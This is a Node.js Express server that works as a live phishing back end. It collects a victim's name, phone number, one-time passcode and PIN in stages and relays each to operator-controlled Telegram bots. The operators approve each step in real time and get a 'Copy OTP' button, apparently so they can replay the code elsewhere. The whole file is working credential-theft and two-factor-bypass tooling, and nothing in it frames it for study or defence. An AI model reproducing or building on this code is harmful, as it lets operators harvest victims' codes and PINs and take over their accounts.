require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------- IN-MEMORY STORES ----------
const phoneRequests = {};
const otpRequests = {};
const pinRequests = {};
const requestMeta = {};

// ---------- BOTS ----------
const bots = [];
Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------- MIDDLEWARE ----------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------- HELPERS ----------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.error('❌ Telegram error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id }
    );
  } catch {}
}

// ---------- WEBHOOKS ----------
async function setWebhook(bot) {
  if (!DOMAIN) return;
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
    );
    console.log(`✅ Webhook set for ${bot.botId}`);
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------- PHONE STEP ----------
app.post('/submit-phone', (req, res) => {
  try {
    const { name, phone, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    phoneRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `📱 PHONE VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-phone/:id', (req, res) => {
  const result = phoneRequests[req.params.id];
  if (result === true) return res.json({ redirect: 'link.html' });  // FIXED
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ---------- OTP STEP ----------
app.post('/submit-otp', (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    otpRequests[requestId] = null;
    // CHANGE 1: Store the OTP in requestMeta so we can retrieve it for copying
    requestMeta[requestId] = { name, phone, otp, botId };

    // CHANGE 2: Added a second row with a "Copy OTP" button
    sendTelegram(
      bot,
      `🔐 OTP VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 OTP: ${otp}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
        ],
        [
          { text: '📋 Copy OTP', callback_data: `copy_otp:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', (req, res) => {
  res.json({ approved: otpRequests[req.params.id] ?? null });
});

// ---------- PIN STEP ----------
app.post('/submit-pin', (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `🔐 PIN VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 PIN: ${pin}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', (req, res) => {
  res.json({ approved: pinRequests[req.params.id] ?? null });
});

// ---------- TELEGRAM CALLBACK WEBHOOK ----------
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, requestId] = cb.data.split(':');
  const meta = requestMeta[requestId];

  // CHANGE 3: Handle the "Copy OTP" action
  if (action === 'copy_otp') {
    if (meta && meta.otp) {
      // Build a message that displays only the OTP inside a code block
      const copyText = `📋 OTP Text (Tap & hold to copy)
━━━━━━━━━━━━━━━━━━━━━
<code>${meta.otp}</code>
━━━━━━━━━━━━━━━━━━━━━

👤 Name: ${meta.name || '—'}
📞 Phone: ${meta.phone || '—'}`;

      try {
        // Edit the original message: replace text, remove all buttons
        await axios.post(`https://api.telegram.org/bot${bot.token}/editMessageText`, {
          chat_id: cb.message.chat.id,
          message_id: cb.message.message_id,
          text: copyText,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: [] }
        });
      } catch (editError) {
        console.error('Edit error:', editError.message);
      }
    }

    await answerCallback(bot, cb.id);
    return res.sendStatus(200); // Stop here, do not run the rest of the logic
  }

  let feedback = '';

  // Phone decisions
  if (action === 'phone_ok') {
    phoneRequests[requestId] = true;
    feedback = '✅ Phone approved – redirecting to OTP page';
  }
  if (action === 'phone_bad') {
    phoneRequests[requestId] = false;
    feedback = '❌ Phone rejected';
  }

  // OTP decisions
  if (action === 'otp_ok') {
    otpRequests[requestId] = true;
    feedback = '✅ OTP approved – redirecting to PIN page';
  }
  if (action === 'otp_bad') {
    otpRequests[requestId] = false;
    feedback = '❌ OTP rejected';
  }

  // PIN decisions
  if (action === 'pin_ok') {
    pinRequests[requestId] = true;
    feedback = '✅ PIN approved – redirecting to success page';
  }
  if (action === 'pin_bad') {
    pinRequests[requestId] = false;
    feedback = '❌ PIN rejected';
  }

  if (feedback && meta) {
    await sendTelegram(
      bot,
      `📝 ACTION TAKEN
👤 Name: ${meta.name || '—'}
📞 Phone: ${meta.phone || '—'}
${feedback}`
    );
  }

  await answerCallback(bot, cb.id);
  res.sendStatus(200);
});

// ---------- BOT ENTRY POINT ----------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------- DEBUG (optional) ----------
app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
  });
});

// ---------- START SERVER ----------
setAllWebhooks().then(() => {
  app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
});